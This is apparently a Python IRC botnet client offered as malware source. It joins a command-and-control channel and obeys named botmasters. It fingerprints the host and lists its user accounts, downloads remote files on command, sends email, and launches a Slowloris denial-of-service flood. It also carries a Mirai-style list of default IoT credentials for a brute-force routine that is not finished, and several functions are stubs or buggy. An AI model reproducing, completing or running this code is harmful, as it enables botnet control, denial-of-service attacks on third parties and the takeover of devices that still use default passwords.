#!/usr/bin/python3
from time import time,sleep
from socket import socket as sock,AF_INET,SOCK_STREAM,error as sock_error
from ssl import wrap_socket as ssl_wrap
creds=(("root","xc3511"),("root","vizxv"),("root","admin"),("root","888888"),("root","xmhdipc"),("root","default"),("root","juantech"),("root","123456"),("root","54321"),("root",""),("root","12345"),("root","pass"),("root","1111"),("root","666666"),("root","password1234"),("root","klv123"),("root","klv1234"),("root","Zte521"),("root","hi3518"),("root","jvbzd"),("root","anko"),("root","zlxx."),("root","7ujMko0vizxv"),("root","7ujMko0admin"),("root","system"),("root","ikweb"),("root","dreambox"),("root","user"),("root","realtek"),("root","00000000"),("admin","admin"),("admin","password"),("admin","admin1234"),("admin","smcadmin"),("admin","1111"),("admin","1111111"),("admin","1234"),("admin","12345"),("admin","54321"),("admin","123456"),("admin","7ujMko0admin"),("admin","1234"),("admin","pass"),("admin","meinsm"),("support","support"),("user","user"),("Administrator","admin"),("service","service"),("supervisor","supervisor"),("guest","guest"),("guest","12345"),("guest","12345"),("admin1","password"),("administrator","1234"),("666666","666666"),("888888","888888"),("ubnt","ubnt"),("tech","tech"),("mother","fucker"))
botmasters=["tjgerot", "sovnrswiwg"]
irc="irc.freenode.net"
port=6667
botid=0
channel="##qdmdrqtvd"
chanpass="helloworldasdf"
sck=sock(AF_INET,SOCK_STREAM)
sck.connect((irc,port))
bot_files=[]
list_of_sockets=[]
uas=["Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"]
cod=""
node=""
errors=[]
death=None
victims=[]
computer=""
distro=None
pub_ip=None
prv_ip=None
system=None
birth=time()
release=None
version=None
py_type=None
machine=None
processor=None
py_version=None
architecture=None
multiprocessor=None
def post(msg,chat=False): # TODO Add encryption parameter
    if chat:
        if "\r\n" in msg:
            lines=msg.split("\r\n")
            for line in lines:
                sck.send(("PRIVMSG "+channel+" :"+line+"\r\n").encode("UTF8"))
                sleep(2)
        else:
            packet="PRIVMSG "+channel+" :"+msg+"\r\n"
            sck.send(packet.encode("UTF8"))
    else:
        sck.send((msg+"\r\n").encode("UTF8"))
def cmd_exec(command,verbose=False):
    pass
def ssh_brute(ip):
    ssh_sock=sock(family=AF_INET,type=SOCK_STREAM)
    sock.connect((ip,22))
    for u,p in creds:
        pass
        # TODO Attempt to login with u & p
def address(verbose=False):
    try:
        from urllib.request import urlopen
        try:
            pub_ip=urlopen("http://api.ipify.org/").read().decode("UTF8")
        except Exception:
            try:
                pub_ip=urlopen("https://myexternalip.com/raw").read().decode("UTF8")
            except Exception:
                try:
                    pub_ip=urlopen("https://wtfismyip.com/text").read().decode("UTF8")
                except Exception:
                    try:
                        pub_ip=urlopen("http://checkip.dyndns.org/").read().decode("UTF8").split("<body>")[1].split("</body>")[0].split(":")[1].strip()
                    except Exception:
                        pass
        if verbose:
            post(pub_ip,True)
    except Exception as e:
        if verbose:
            post("Failed to report external IP address.",True)
        errors.append("Address: [%s] %s" % (time(),e))
        print(e)
def fingerprint(verbose=False):
    try:
        from platform import uname,architecture,platform,python_build,python_implementation,win32_ver
        from uuid import getnode as get_mac
        from os import listdir
        d=uname()
        a=architecture()
        b=python_build()
        platform=platform()
        system=d.system
        if system=="Windows":
            multiprocessor="Multi" in win32_ver()[2]
        elif system=="Linux":
            l=linux_distribution()
            distro={"name":l[0],"version":l[1]}
        release=d.release
        mac="".join(c+":" if i%2 else c for i,c in enumerate(hex(get_mac())[2:].zfill(12)))[:-1].upper()
        version=d.version
        machine=d.machine
        processor=d.processor
        node=d.node
        architecture={"bits":a[0],"linkage":a[1]}
        py_version={"version":b[0],"install_date":b[1]}
        py_type=python_implementation()
        if system=="Windows":
            vics=listdir("C:/Users")
            for a in vics:
                if "." not in a and "Default" not in a and a!="Public" and a!="All Users":
                    victims.append(a)
        elif system=="Linux":
            for victim in listdir("/home"):
                victims.append(victim)
        try:
            victims=list(set(victims))
        except UnboundLocalError:
            pass
        qproc="multi-core" if multiprocessor else "single-core"
        computer=node+" "+str(victims)+": "+platform+" "+machine+" "+architecture["bits"]+" "+qproc+" ["+mac+"]"
        if verbose:
            post(computer,True)
    except Exception as e:
        if verbose:
            post("Fingerprinting failed.",True)
        errors.append("Fingerprint: [%s] %s"%(time(),e))
        print(e)
def suicide(verbose=False):
    try:
        if verbose:
            post("Goodbye World!",True)
        cod="Suicide"
        death=time()
        exit(0)
    except Exception as e:
        if verbose:
            post("Suicide failed.",True)
        errors.append("Suicide: [%s] %s"%(time(),e))
def send_email(sender,password,recipient,subject,message,verbose=False):
    # TODO Add attachment option
    # TODO Add 'read message from file' option
    try:
        from smtplib import SMTP
        server=SMTP("smtp.gmail.com:587") # TODO Add support for other email providers
        server.ehlo()
        server.starttls()
        server.login(sender,password)
        msg="\r\n".join(["From: "+sender,"To: "+recipient,"Subject: "+subject,"",message])
        server.sendmail(sender,recipient,msg)
        server.quit()
    except Exception as e:
        if verbose:
            post("Email failed to send.",True)
        print(e)
        errors.append("Email: [%s] %s"%(time(),e))
def init_socket(ip, port, https, randuseragent):
    s=sock(AF_INET,SOCK_STREAM)
    s.settimeout(4)
    if https:
        s=ssl_wrap(s)
    s.connect((ip, port))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
    if randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(uas)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s
# TODO Add a Hydra / brute force command
def slowloris(host,sport,randuseragent,https,sockets,verbose=False):
    ip=host
    port=int(sport)
    https="TRUE" in https.upper()
    randuseragent = "TRUE" in randuseragent.upper()
    socket_count=int(sockets)
    for _ in range(socket_count):
        try:
            s=init_socket(ip,port,https,randuseragent)
        except sock_error:
            break
        list_of_sockets.append(s)
def reconnect(verbose=False):
    try:
        if verbose:
            post("Reconnecting.",True)
        cod="Reconnect"
        return False
    except Exception as e:
        if verbose:
            post("Reconnect failed.",True)
        errors.append("Reconnect: [%s] %s"%(time(),e))
def download(url,filename,verbose=False):
    from urllib.request import urlretrieve
    try:
        urlretrieve(url,filename)
        files.append(filename) # TODO Also save the file size
        if verbose:
            post("Download successful.",True)
    except Exception as e:
        if verbose:
            post("Download failed.",True)
        errors.append("Download: [%s] %s"%(time(),e))
def scan_range(ip_start,ip_stop,port_start,port_stop,verbose=False):
    try:
        pass # TODO Implement range IP,range port scanning
    except Exception as e:
        if verbose:
            post("Range scan failed.",True)
        errors.append("Scan Range: [%s] %s"%(time(),e))
def scan(ip,sport_start,port_stop,verbose=False):
    try:
        pass # TODO Implement rahge port scanning
    except Exception as e:
        if verbose:
            post("Scan failed.",True)
        errors.append("Scan: [%s] %s"%(time(),e))
def profile(verbose=False):
    post("Wilco.",True)
    address(verbose)
    fingerprint(verbose)
def interpretCommands(command):
    verbose="VERBOSE" in command.split()[-1].upper()
    func=command.split()[0].upper()
    if "KILL" in func:
        post("Wilco.",True)
        suicide(verbose)
    elif "PROFILE" in func:
        post("Wilco.",True)
        profile(verbose)
    elif "FINGERPRINT" in func:
        post("Wilco.",True)
        fingerprint(verbose)
    elif "RECONNECT" in func:
        post("Wilco.",True)
        return reconnect(verbose)
    elif "DOWNLOAD" in func:
        post("Wilco.",True)
        download(command.split()[1],command.split()[2],verbose)
    elif "EMAIL" in func: # TODO Interpret @@@ delims
        post("Wilco.",True)
        print(command.split("<<<")[1].split(">>>")[0])
        send_email(command.split()[1],command.split()[2],command.split()[3],command.split()[4],command.split("<<<")[1].split(">>>")[0],verbose)
    elif "ADDRESS" in func:
        post("Wilco.",True)
        address(verbose)
    elif "SLOWLORIS" in func:
        post("Wilco.",True)
        slowloris(command.split()[1],command.split()[2],command.split()[3],command.split()[4],command.split()[5],verbose)
    elif "SCAN-RANGE" in func:
        post("Wilco.",True)
        scan_range(command.split()[1],command.split()[2],command.split()[3],command.split()[4],verbose)
    elif "SCAN" in func:
        post("Wilco.",True)
        scan(command.split()[1],command.split()[2],command.split()[3])
    elif verbose:
        post("Unknown Command: "+command.split()[0],True)
def main():
    data=""
    registered=False
    joined=False
    while True:
        data=sck.recv(1024)
        parts=data.decode("UTF8").split("\r\n")
        for part in parts:
            if "PING" in part:
                post("PONG "+part.split()[1])
            if part.split("!")[0].replace(":","") in botmasters:
                if "PRIVMSG" in part and part.split("PRIVMSG")[1].replace(channel+" :","").strip().upper().startswith("BOTS"):
                    if "-" in part.split("PRIVMSG")[1].replace(channel+" :","").strip().upper().split("[")[1].split("]")[0]:
                        start=int(part.split("PRIVMSG")[1].replace(channel+" :","").strip().upper().split("[")[1].split("]")[0].split("-")[0])
                        stop=int(part.split("PRIVMSG")[1].replace(channel+" :","").strip().upper().split("[")[1].split("]")[0].split("-")[1])
                        if id >= start and id <= stop and part.split("PRIVMSG")[1].replace(channel+" :","").strip().upper().split("]")[1].strip().startswith("COMMAND"):
                                live=interpretCommands(part.split("PRIVMSG")[1].replace(channel+" :","").strip().replace("COMMAND","").replace("command","").replace("Command","").strip())
                                if live is False:
                                    return True
                    else:
                        if id is int(part.split("PRIVMSG")[1].replace(channel+" :","").strip().upper().split("[")[1].split("]")[0]) and part.plit("PRIVMSG")[1].replace(channel+" :","").strip().upper().split("]")[1].strip().startswith("COMMAND"):
                            live=interpretCommands(part.split("PRIVMSG")[1].replace(channel+" :","").split("]")[1].strip().replace("COMMAND","").replace("command","").replace("Command","").strip())
                elif "PRIVMSG" in part and part.split("PRIVMSG")[1].replace(channel+" :","").strip().upper().startswith("COMMAND"):
                    live=interpretCommands(part.split("PRIVMSG")[1].replace(channel+" :","").strip().replace("COMMAND","").replace("command","").replace("Command","").strip())
                    if live is False:
                        return True
                elif "HELLO WORLD" in part.upper():
                    post("Hello Master!",True)
        if registered is False:
            nick="bot"+str(botid)
            post("NICK "+nick)
            post("USER "+nick+" "+nick+" "+nick+" :"+nick)
            registered=True
        if joined is False:
            post("JOIN "+channel+" "+chanpass)
            joined=True
main()
